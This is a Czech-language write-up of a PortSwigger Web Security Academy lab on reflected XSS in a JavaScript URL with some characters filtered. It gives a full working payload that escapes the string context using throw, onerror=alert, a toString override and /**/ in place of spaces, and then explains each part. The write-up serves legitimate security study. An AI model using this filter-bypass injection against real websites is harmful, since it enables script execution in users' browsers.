# Lab Writeup: Reflected XSS in a JavaScript URL with some characters blocked

- Tento dokument slouží jako studijní materiál a záznam z PortSwigger Web Security Academy
- **Lab Name:** Reflected XSS in a JavaScript URL with some characters blocked

# Popis útoku
Aplikace vkládala uživatelský vstup přímo do existujícího JavaScriptového kontextu (URL adresy na stránce), ale některé klíčové znaky byly blokovány nebo filtrovány. Cílem bylo injektovat kód tak, aby se přesto vykonal uvnitř tohoto JS bloku.

# Proč to fungovalo?
Využitím specifického payloadu, který chytře obcházel blokované znaky (např. pomocí syntaktických triků s objekty, `throw`, `onerror` nebo manipulací s řetězci), došlo k úniku z původního kontextu JavaScriptu a úspěšnému spuštění funkce `alert` v kontextu prohlížeče.

## Použitý payload:
> **Pozor:** Místo `YOUR-LAB-ID` si v URL adrese dosaď své vlastní ID aktivního labu z PortSwiggeru.

```text
[https://YOUR-LAB-ID.web-security-academy.net/post?postId=3&,%27](https://YOUR-LAB-ID.web-security-academy.net/post?postId=3&,%27)}%2Cx%3Dx=>{throw/**/onerror=alert,1337},toString=x,window%2b%2b%2527%27,%27x:%27

# Vysvětlení do podrobná

** postId=3& – Základní parametr labu pro zobrazení konkrétního příspěvku.

** %27 – URL kódovaný apostrof ('), kterým jsem ukončil původní textový řetězec v kódu stránky.

** } – Složená závorka, kterou jsem uzavřel předchozí blok kódu (např. funkci), abych se dostal ven.

** x=x=>{...} – Definice vlastní JavaScriptové šipkové funkce, abych obešel zakázaná slova.

** throw – Příkaz pro úmyslné vyvolání chyby v programu.

**  /**/ – Komentář sloužící jako neviditelná výplň místo zakázaných mezer (filtr ho přehlédl, ale JavaScript ho zpracoval).

** onerror=alert – Nastavení, které při vyvolání chyby okamžitě spustí funkci alert.

** 1337 – Hodnota předaná do funkce alert.

** ,toString=x – Úprava chování objektu pro převod na řetězec.

** window%2b%2b – Operace inkrementace s objektem window (kde %2b je plus +), která donutit prohlížeč kód okamžitě vyhodnotit.

** %2527 – Dvojitě URL kódovaný apostrof (%27), který slouží k uzavření řetězce v dalším kontextu

** ,%27x:%27 – Uzavření zbývajících řetězců, aby JavaScript dál nehlásil syntaktickou chybu.

